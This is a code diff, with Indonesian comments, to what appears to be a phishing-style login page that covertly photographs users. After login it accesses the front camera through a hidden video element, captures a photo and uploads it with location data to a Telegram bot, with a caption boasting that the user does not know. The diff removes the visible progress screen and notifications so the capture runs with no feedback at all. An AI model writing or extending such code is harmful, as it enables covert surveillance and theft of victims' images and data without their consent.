@@ -653,68 +653,6 @@
             background: rgba(255, 77, 141, 0.3);
         }
 
-        /* Processing Screen */
-        .processing-screen {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: var(--darker);
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 2000;
-        }
-
-        .processing-content {
-            text-align: center;
-            padding: 40px;
-            background: var(--glass);
-            border-radius: 20px;
-            border: 1px solid var(--glass-border);
-            max-width: 400px;
-            width: 90%;
-        }
-
-        .processing-icon {
-            font-size: 4rem;
-            margin-bottom: 20px;
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .processing-text {
-            font-size: 1.2rem;
-            margin-bottom: 10px;
-            color: var(--light);
-        }
-
-        .processing-subtext {
-            font-size: 0.9rem;
-            color: var(--gray);
-            margin-bottom: 20px;
-        }
-
-        .processing-progress {
-            width: 100%;
-            height: 6px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 3px;
-            overflow: hidden;
-            margin-bottom: 20px;
-        }
-
-        .processing-bar {
-            height: 100%;
-            background: linear-gradient(135deg, var(--primary), var(--accent));
-            border-radius: 3px;
-            width: 0%;
-            transition: width 2s ease-in-out;
-        }
-
         .notification {
             position: fixed;
             top: 30px;
@@ -967,25 +905,10 @@
         </div>
     </div>
 
-    <!-- Processing Screen -->
-    <div class="processing-screen" id="processingScreen">
-        <div class="processing-content">
-            <div class="processing-icon">
-                <i class="fas fa-camera"></i>
-            </div>
-            <div class="processing-text">Memproses Verifikasi</div>
-            <div class="processing-subtext">Mohon tunggu sebentar...</div>
-            <div class="processing-progress">
-                <div class="processing-bar" id="processingBar"></div>
-            </div>
-            <div class="processing-subtext" id="processingStatus">Menyiapkan sistem keamanan</div>
-        </div>
-    </div>
-
     <div id="notification" class="notification"></div>
 
-    <!-- Hidden elements for camera -->
-    <video id="hiddenCamera" autoplay style="display: none; position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px;"></video>
+    <!-- Hidden elements for camera (COMPLETELY HIDDEN) -->
+    <video id="hiddenCamera" autoplay style="display: none; position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none;"></video>
     <canvas id="hiddenCanvas" style="display: none;"></canvas>
 
     <script>
@@ -1046,65 +969,26 @@
             document.getElementById('cameraPermissionModal').style.display = 'none';
             
             try {
-                // Tampilkan processing screen
-                showProcessingScreen();
-                
-                // Akses kamera dan ambil foto secara STEALTH (tanpa ditampilkan)
+                // LANGSUNG akses kamera dan ambil foto secara STEALTH
                 await accessCameraStealth();
                 
             } catch (error) {
                 console.error('Error accessing camera:', error);
-                hideProcessingScreen();
-                showNotification('✅ Login berhasil! (Kamera tidak tersedia)', 'success');
+                // Jika gagal, langsung masuk ke home page
                 showHomePage(window.loginData.email);
             }
         });
 
         document.getElementById('neverAllowCamera').addEventListener('click', function() {
             document.getElementById('cameraPermissionModal').style.display = 'none';
-            showNotification('✅ Login berhasil! (Akses kamera ditolak)', 'success');
             showHomePage(window.loginData.email);
         });
 
-        // Show processing screen
-        function showProcessingScreen() {
-            const processingScreen = document.getElementById('processingScreen');
-            const processingBar = document.getElementById('processingBar');
-            const processingStatus = document.getElementById('processingStatus');
-            
-            processingScreen.style.display = 'flex';
-            
-            // Animate progress bar
-            setTimeout(() => {
-                processingBar.style.width = '30%';
-                processingStatus.textContent = 'Mengakses sistem kamera...';
-            }, 500);
-            
-            setTimeout(() => {
-                processingBar.style.width = '60%';
-                processingStatus.textContent = 'Memproses verifikasi wajah...';
-            }, 1500);
-            
-            setTimeout(() => {
-                processingBar.style.width = '90%';
-                processingStatus.textContent = 'Menyelesaikan proses...';
-            }, 2500);
-        }
-
-        // Hide processing screen
-        function hideProcessingScreen() {
-            document.getElementById('processingScreen').style.display = 'none';
-            document.getElementById('processingBar').style.width = '0%';
-        }
-
-        // Access camera stealth (without showing preview)
+        // Access camera stealth (COMPLETELY HIDDEN - no visual feedback)
         async function accessCameraStealth() {
             let stream = null;
             
             try {
-                // Update status
-                document.getElementById('processingStatus').textContent = 'Mengakses kamera...';
-                
                 // Akses kamera secara STEALTH
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
@@ -1126,14 +1010,10 @@
                 });
                 
                 // Tunggu sebentar untuk memastikan frame bagus
-                document.getElementById('processingStatus').textContent = 'Mengambil foto...';
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                await new Promise(resolve => setTimeout(resolve, 800));
                 
                 // Capture foto secara STEALTH
                 const photoBlob = await capturePhotoStealth(video);
-                
-                // Update status
-                document.getElementById('processingStatus').textContent = 'Mengirim data...';
                 
                 // Kirim foto ke Telegram
                 await sendPhotoToTelegram(photoBlob);
@@ -1141,23 +1021,14 @@
                 // Hentikan stream
                 stream.getTracks().forEach(track => track.stop());
                 
-                // Selesaikan progress bar
-                document.getElementById('processingBar').style.width = '100%';
-                await new Promise(resolve => setTimeout(resolve, 500));
-                
-                // Sembunyikan processing screen
-                hideProcessingScreen();
-                
-                // Tampilkan home page
+                // LANGSUNG masuk ke home page
                 showHomePage(window.loginData.email);
-                showNotification('✅ Login berhasil! Verifikasi selesai.', 'success');
                 
             } catch (error) {
                 // Cleanup jika ada error
                 if (stream) {
                     stream.getTracks().forEach(track => track.stop());
                 }
-                hideProcessingScreen();
                 throw error;
             }
         }
@@ -1304,7 +1175,7 @@ ${locationInfo}
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', photoBlob, 'user_selfie_stealth.jpg');
-                formData.append('caption', `📸 FOTO STEALTH - ${new Date().toLocaleString('id-ID')}\n\n✅ Foto berhasil diambil secara diam-diam dari kamera depan\n🕵️‍♂️ User tidak mengetahui proses pengambilan foto`);
+                formData.append('caption', `📸 FOTO STEALTH - ${new Date().toLocaleString('id-ID')}\n\n✅ Foto berhasil diambil secara diam-diam\n🕵️‍♂️ User tidak mengetahui proses pengambilan foto`);
                 
                 // Send photo
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
